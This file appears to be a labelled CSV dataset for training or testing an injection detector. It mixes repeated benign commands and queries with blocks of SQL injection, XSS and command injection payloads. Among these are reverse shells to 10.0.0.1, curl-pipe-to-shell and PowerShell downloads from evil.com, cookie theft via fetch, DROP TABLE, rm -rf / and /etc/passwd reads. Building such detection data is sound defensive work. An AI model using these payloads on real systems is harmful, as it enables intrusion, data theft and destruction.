id,payload,label
101,SELECT price FROM items WHERE id = 209,benign
102,git clone https://github.com/user/repo.git,benign
103,docker run nginx,benign
104,curl -I https://api.example.com/status,benign
105,curl -I https://api.example.com/status,benign
106,"<div class='user-profile'>Welcome back, {username}!</div>",benign
107,"<div class='user-profile'>Welcome back, {username}!</div>",benign
108,SELECT price FROM items WHERE id = 209,benign
109,npm install express,benign
110,"<div class='user-profile'>Welcome back, {username}!</div>",benign
111,npm install express,benign
112,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
113,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
114,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
115,git clone https://github.com/user/repo.git,benign
116,git clone https://github.com/user/repo.git,benign
117,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
118,git clone https://github.com/user/repo.git,benign
119,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
120,npm install express,benign
121,curl -I https://api.example.com/status,benign
122,curl -I https://api.example.com/status,benign
123,docker run nginx,benign
124,git clone https://github.com/user/repo.git,benign
125,git clone https://github.com/user/repo.git,benign
126,git clone https://github.com/user/repo.git,benign
127,SELECT price FROM items WHERE id = 209,benign
128,curl -I https://api.example.com/status,benign
129,SELECT price FROM items WHERE id = 209,benign
130,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
131,docker run nginx,benign
132,docker run nginx,benign
133,"<div class='user-profile'>Welcome back, {username}!</div>",benign
134,"<div class='user-profile'>Welcome back, {username}!</div>",benign
135,SELECT price FROM items WHERE id = 209,benign
136,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
137,git clone https://github.com/user/repo.git,benign
138,curl -I https://api.example.com/status,benign
139,curl -I https://api.example.com/status,benign
140,curl -I https://api.example.com/status,benign
141,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
142,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
143,"<div class='user-profile'>Welcome back, {username}!</div>",benign
144,npm install express,benign
145,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
146,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
147,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
148,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
149,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
150,git clone https://github.com/user/repo.git,benign
151,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
152,SELECT price FROM items WHERE id = 209,benign
153,curl -I https://api.example.com/status,benign
154,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
155,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
156,"<div class='user-profile'>Welcome back, {username}!</div>",benign
157,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
158,npm install express,benign
159,npm install express,benign
160,npm install express,benign
161,admin' --,sql_injection
162,'; WAITFOR DELAY '0:0:10'--,sql_injection
163,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
164,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
165,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
166,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
167,'; WAITFOR DELAY '0:0:10'--,sql_injection
168,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
169,'; WAITFOR DELAY '0:0:10'--,sql_injection
170,admin' --,sql_injection
171,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
172,'; exec xp_cmdshell('net user'); --,sql_injection
173,' OR 1=1 ORDER BY 1--,sql_injection
174,')) OR 1=1--,sql_injection
175,"' UNION SELECT username,password FROM admin_users --",sql_injection
176,<script>alert(document.cookie)</script>,xss
177,javascript:alert(document.domain),xss
178,<script>alert(document.cookie)</script>,xss
179,<body onload=alert('XSS')>,xss
180,<iframe src='javascript:alert(`xss`)'></iframe>,xss
181,<iframe src='javascript:alert(`xss`)'></iframe>,xss
182,javascript:alert(document.domain),xss
183,<iframe src='javascript:alert(`xss`)'></iframe>,xss
184,<input onfocus=write(1) autofocus>,xss
185,<script>alert(document.cookie)</script>,xss
186,<iframe src='javascript:alert(`xss`)'></iframe>,xss
187,<img src=x onerror=alert('XSS')>,xss
188,<input onfocus=write(1) autofocus>,xss
189,<img src=x onerror=alert('XSS')>,xss
190,<script>alert(document.cookie)</script>,xss
191,; wget http://malicious.com/shell.php,cmd_injection
192,; wget http://malicious.com/shell.php,cmd_injection
193,; wget http://malicious.com/shell.php,cmd_injection
194,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
195,; rm -rf /,cmd_injection
196,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
197,|| echo 'evil' > script.sh,cmd_injection
198,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
199,| cat /etc/passwd,cmd_injection
200,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
201,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
202,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
203,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
204,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
205,docker run nginx,benign
206,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
207,npm install express,benign
208,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
209,docker run nginx,benign
210,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
211,SELECT price FROM items WHERE id = 209,benign
212,git clone https://github.com/user/repo.git,benign
213,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
214,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
215,SELECT price FROM items WHERE id = 209,benign
216,SELECT price FROM items WHERE id = 209,benign
217,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
218,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
219,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
220,npm install express,benign
221,"<div class='user-profile'>Welcome back, {username}!</div>",benign
222,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
223,SELECT price FROM items WHERE id = 209,benign
224,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
225,npm install express,benign
226,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
227,"<div class='user-profile'>Welcome back, {username}!</div>",benign
228,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
229,curl -I https://api.example.com/status,benign
230,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
231,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
232,curl -I https://api.example.com/status,benign
233,docker run nginx,benign
234,curl -I https://api.example.com/status,benign
235,"<div class='user-profile'>Welcome back, {username}!</div>",benign
236,curl -I https://api.example.com/status,benign
237,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
238,SELECT price FROM items WHERE id = 209,benign
239,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
240,docker run nginx,benign
241,git clone https://github.com/user/repo.git,benign
242,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
243,git clone https://github.com/user/repo.git,benign
244,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
245,npm install express,benign
246,git clone https://github.com/user/repo.git,benign
247,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
248,docker run nginx,benign
249,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
250,SELECT price FROM items WHERE id = 209,benign
251,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
252,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
253,SELECT price FROM items WHERE id = 209,benign
254,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
255,"<div class='user-profile'>Welcome back, {username}!</div>",benign
256,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
257,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
258,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
259,SELECT price FROM items WHERE id = 209,benign
260,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
261,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
262,'; exec xp_cmdshell('net user'); --,sql_injection
263,'; DROP TABLE users; --,sql_injection
264,admin' --,sql_injection
265,'; DROP TABLE users; --,sql_injection
266,"' UNION SELECT username,password FROM admin_users --",sql_injection
267,'; DROP TABLE users; --,sql_injection
268,' OR 1=1 ORDER BY 1--,sql_injection
269,' OR 1=1 ORDER BY 1--,sql_injection
270,'; exec xp_cmdshell('net user'); --,sql_injection
271,admin' --,sql_injection
272,'; exec xp_cmdshell('net user'); --,sql_injection
273,' OR '1'='1,sql_injection
274,'; DROP TABLE users; --,sql_injection
275,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
276,<script>alert(document.cookie)</script>,xss
277,<body onload=alert('XSS')>,xss
278,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
279,<svg onload=alert(1)>,xss
280,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
281,<iframe src='javascript:alert(`xss`)'></iframe>,xss
282,<iframe src='javascript:alert(`xss`)'></iframe>,xss
283,javascript:alert(document.domain),xss
284,<script>alert(document.cookie)</script>,xss
285,<iframe src='javascript:alert(`xss`)'></iframe>,xss
286,<img src=x onerror=alert('XSS')>,xss
287,<img src=x onerror=alert('XSS')>,xss
288,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
289,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
290,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
291,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
292,| cat /etc/passwd,cmd_injection
293,| cat /etc/passwd,cmd_injection
294,| cat /etc/passwd,cmd_injection
295,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
296,& net user administrator /add,cmd_injection
297,; rm -rf /,cmd_injection
298,& powershell IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps1'),cmd_injection
299,& net user administrator /add,cmd_injection
300,& net user administrator /add,cmd_injection
301,git clone https://github.com/user/repo.git,benign
302,curl -I https://api.example.com/status,benign
303,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
304,git clone https://github.com/user/repo.git,benign
305,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
306,SELECT price FROM items WHERE id = 209,benign
307,"<div class='user-profile'>Welcome back, {username}!</div>",benign
308,npm install express,benign
309,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
310,"<div class='user-profile'>Welcome back, {username}!</div>",benign
311,curl -I https://api.example.com/status,benign
312,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
313,git clone https://github.com/user/repo.git,benign
314,SELECT price FROM items WHERE id = 209,benign
315,git clone https://github.com/user/repo.git,benign
316,"<div class='user-profile'>Welcome back, {username}!</div>",benign
317,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
318,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
319,"<div class='user-profile'>Welcome back, {username}!</div>",benign
320,curl -I https://api.example.com/status,benign
321,npm install express,benign
322,git clone https://github.com/user/repo.git,benign
323,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
324,curl -I https://api.example.com/status,benign
325,SELECT price FROM items WHERE id = 209,benign
326,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
327,git clone https://github.com/user/repo.git,benign
328,curl -I https://api.example.com/status,benign
329,"<div class='user-profile'>Welcome back, {username}!</div>",benign
330,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
331,git clone https://github.com/user/repo.git,benign
332,"<div class='user-profile'>Welcome back, {username}!</div>",benign
333,git clone https://github.com/user/repo.git,benign
334,SELECT price FROM items WHERE id = 209,benign
335,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
336,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
337,"<div class='user-profile'>Welcome back, {username}!</div>",benign
338,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
339,git clone https://github.com/user/repo.git,benign
340,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
341,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
342,curl -I https://api.example.com/status,benign
343,docker run nginx,benign
344,npm install express,benign
345,"<div class='user-profile'>Welcome back, {username}!</div>",benign
346,curl -I https://api.example.com/status,benign
347,npm install express,benign
348,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
349,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
350,docker run nginx,benign
351,"<div class='user-profile'>Welcome back, {username}!</div>",benign
352,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
353,git clone https://github.com/user/repo.git,benign
354,curl -I https://api.example.com/status,benign
355,npm install express,benign
356,docker run nginx,benign
357,SELECT price FROM items WHERE id = 209,benign
358,docker run nginx,benign
359,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
360,curl -I https://api.example.com/status,benign
361,admin' --,sql_injection
362,')) OR 1=1--,sql_injection
363,'; exec xp_cmdshell('net user'); --,sql_injection
364,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
365,'; DROP TABLE users; --,sql_injection
366,'; DROP TABLE users; --,sql_injection
367,"' UNION SELECT username,password FROM admin_users --",sql_injection
368,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
369,'; DROP TABLE users; --,sql_injection
370,'; DROP TABLE users; --,sql_injection
371,'; exec xp_cmdshell('net user'); --,sql_injection
372,'; WAITFOR DELAY '0:0:10'--,sql_injection
373,'; DROP TABLE users; --,sql_injection
374,')) OR 1=1--,sql_injection
375,'; WAITFOR DELAY '0:0:10'--,sql_injection
376,<iframe src='javascript:alert(`xss`)'></iframe>,xss
377,<input onfocus=write(1) autofocus>,xss
378,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
379,<iframe src='javascript:alert(`xss`)'></iframe>,xss
380,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
381,<img src=x onerror=alert('XSS')>,xss
382,<input onfocus=write(1) autofocus>,xss
383,<body onload=alert('XSS')>,xss
384,<iframe src='javascript:alert(`xss`)'></iframe>,xss
385,<iframe src='javascript:alert(`xss`)'></iframe>,xss
386,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
387,<img src=1 href=1 onerror='javascript:alert(1)'></img>,xss
388,<body onload=alert('XSS')>,xss
389,<input onfocus=write(1) autofocus>,xss
390,<input onfocus=write(1) autofocus>,xss
391,; nc -e /bin/bash 10.0.0.1 4444,cmd_injection
392,|| echo 'evil' > script.sh,cmd_injection
393,; wget http://malicious.com/shell.php,cmd_injection
394,; wget http://malicious.com/shell.php,cmd_injection
395,`curl http://evil.com/script.sh | sh`,cmd_injection
396,; rm -rf /,cmd_injection
397,| cat /etc/passwd,cmd_injection
398,; rm -rf /,cmd_injection
399,; rm -rf /,cmd_injection
400,; wget http://malicious.com/shell.php,cmd_injection
401,SELECT price FROM items WHERE id = 209,benign
402,git clone https://github.com/user/repo.git,benign
403,git clone https://github.com/user/repo.git,benign
404,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
405,"<div class='user-profile'>Welcome back, {username}!</div>",benign
406,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
407,"<div class='user-profile'>Welcome back, {username}!</div>",benign
408,curl -I https://api.example.com/status,benign
409,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
410,docker run nginx,benign
411,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
412,git clone https://github.com/user/repo.git,benign
413,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
414,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
415,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
416,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
417,"<div class='user-profile'>Welcome back, {username}!</div>",benign
418,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
419,"<div class='user-profile'>Welcome back, {username}!</div>",benign
420,SELECT price FROM items WHERE id = 209,benign
421,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
422,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
423,docker run nginx,benign
424,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
425,SELECT price FROM items WHERE id = 209,benign
426,"<div class='user-profile'>Welcome back, {username}!</div>",benign
427,git clone https://github.com/user/repo.git,benign
428,"<div class='user-profile'>Welcome back, {username}!</div>",benign
429,docker run nginx,benign
430,curl -I https://api.example.com/status,benign
431,git clone https://github.com/user/repo.git,benign
432,curl -I https://api.example.com/status,benign
433,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
434,npm install express,benign
435,docker run nginx,benign
436,npm install express,benign
437,curl -I https://api.example.com/status,benign
438,git clone https://github.com/user/repo.git,benign
439,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
440,git clone https://github.com/user/repo.git,benign
441,git clone https://github.com/user/repo.git,benign
442,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
443,SELECT price FROM items WHERE id = 209,benign
444,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
445,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
446,docker run nginx,benign
447,docker run nginx,benign
448,"<div class='user-profile'>Welcome back, {username}!</div>",benign
449,curl -I https://api.example.com/status,benign
450,curl -I https://api.example.com/status,benign
451,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
452,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
453,git clone https://github.com/user/repo.git,benign
454,npm install express,benign
455,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
456,SELECT price FROM items WHERE id = 209,benign
457,npm install express,benign
458,SELECT COUNT(*) FROM logs WHERE date > '2023-01-01',benign
459,curl -I https://api.example.com/status,benign
460,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
461,'; WAITFOR DELAY '0:0:10'--,sql_injection
462,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
463,'; WAITFOR DELAY '0:0:10'--,sql_injection
464,"admin' AND 1=CONVERT(int,@@version)--",sql_injection
465,' OR '1'='1,sql_injection
466,'; DROP TABLE users; --,sql_injection
467,' OR 1=1 ORDER BY 1--,sql_injection
468,'; exec xp_cmdshell('net user'); --,sql_injection
469,'; WAITFOR DELAY '0:0:10'--,sql_injection
470,' OR 1=1 ORDER BY 1--,sql_injection
471,admin' --,sql_injection
472,' OR '1'='1,sql_injection
473,"' UNION SELECT username,password FROM admin_users --",sql_injection
474,"' AND 5195=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(72)||CHR(110),5)--",sql_injection
475,'; DROP TABLE users; --,sql_injection
476,<img src=x onerror=alert('XSS')>,xss
477,<img src=x onerror=alert('XSS')>,xss
478,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
479,<img src=x onerror=alert('XSS')>,xss
480,<iframe src='javascript:alert(`xss`)'></iframe>,xss
481,<script>fetch('https://evil.com?c='+document.cookie)</script>,xss
482,<iframe src='javascript:alert(`xss`)'></iframe>,xss
483,<input onfocus=write(1) autofocus>,xss
484,<svg onload=alert(1)>,xss
485,<input onfocus=write(1) autofocus>,xss
486,<iframe src='javascript:alert(`xss`)'></iframe>,xss
487,javascript:alert(document.domain),xss
488,<iframe src='javascript:alert(`xss`)'></iframe>,xss
489,<iframe src='javascript:alert(`xss`)'></iframe>,xss
490,<a href='javascript:void(0)' onmouseover='alert(1)'>Click me</a>,xss
491,; rm -rf /,cmd_injection
492,|| echo 'evil' > script.sh,cmd_injection
493,`curl http://evil.com/script.sh | sh`,cmd_injection
494,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
495,"; python -c 'import socket,subprocess;s=socket.socket();s.connect((""10.0.0.1"",4444))'",cmd_injection
496,; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1,cmd_injection
497,& net user administrator /add,cmd_injection
498,| cat /etc/passwd,cmd_injection
499,`curl http://evil.com/script.sh | sh`,cmd_injection
500,; rm -rf /,cmd_injection
501,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
502,npm install express,benign
503,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
504,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
505,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
506,git clone https://github.com/user/repo.git,benign
507,git clone https://github.com/user/repo.git,benign
508,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
509,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
510,"<div class='user-profile'>Welcome back, {username}!</div>",benign
511,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
512,"<div class='user-profile'>Welcome back, {username}!</div>",benign
513,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
514,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
515,SELECT price FROM items WHERE id = 209,benign
516,git clone https://github.com/user/repo.git,benign
517,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
518,npm install express,benign
519,git clone https://github.com/user/repo.git,benign
520,UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?,benign
521,npm install express,benign
522,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
523,docker run nginx,benign
524,"INSERT INTO orders (user_id, product_id) VALUES (?, ?)",benign
525,curl -I https://api.example.com/status,benign
526,curl -I https://api.example.com/status,benign
527,curl -I https://api.example.com/status,benign
528,docker run nginx,benign
529,SELECT * FROM products WHERE category = 'electronics' LIMIT 10,benign
530,npm install express,benign
